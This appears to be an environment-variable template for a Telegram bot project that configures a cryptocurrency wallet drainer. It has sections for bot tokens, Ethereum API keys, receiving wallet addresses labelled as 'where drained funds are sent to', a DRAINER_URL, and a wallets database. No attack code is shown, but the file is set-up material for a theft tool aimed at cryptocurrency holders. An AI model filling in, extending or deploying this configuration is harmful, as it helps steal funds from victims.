# Environment Variables Template
# Copy this file to .env and fill in your actual values
# DO NOT commit .env to GitHub - only commit .env.template

# ========== TELEGRAM BOT CONFIG ==========
TELEGRAM_BOT_TOKEN=your_bot_token_from_botfather_here
TELEGRAM_MODE=webhook
TELEGRAM_WEBHOOK_URL=https://angelinferno-bot.onrender.com/webhook

# ========== OPTIONAL ALERT CONFIG ==========
# Leave empty if you don't want Telegram alerts
ALERT_TELEGRAM_CHAT_ID=your_telegram_chat_id_here

# ========== OCRS SECURITY ==========
OCRS_SECRET_KEY=generate_a_random_secure_key_with_32_chars_minimum_here
OCRS_TOKEN_EXPIRY_HOURS=24
OCRS_ROTATION_INTERVAL_DAYS=30
OCRS_ENABLED=true

# ========== WEB3 / ALCHEMY CONFIG ==========
ALCHEMY_URL=https://eth-mainnet.g.alchemy.com/v2/your_alchemy_key_here
CRYPTOCOMPARE_API_KEY=your_cryptocompare_key_here
NOWNODES_API_KEY=your_nownodes_key_here

# ========== WALLET ADDRESSES (RECEIVE CRYPTO) ==========
# Where drained funds are sent to
BTC_WALLET_ADDRESS=your_btc_address_here
ETH_WALLET_ADDRESS=your_eth_address_here
USDT_WALLET_ADDRESS=your_usdt_address_here
USDT_CONTRACT_ADDRESS=0x_your_usdt_contract_here
BTC_CONTRACT_ADDRESS=your_btc_contract_here
ETH_CONTRACT_ADDRESS=your_eth_contract_here

# ========== DRAINER CONFIG ==========
DRAINER_URL=https://yoursite.com/drainer
BACKUP_BOT_URL=https://t.me/yourbackup_bot

# ========== DATABASE ==========
DATABASE_PATH=wallets.db

# ========== PORT (For local testing) ==========
PORT=8080
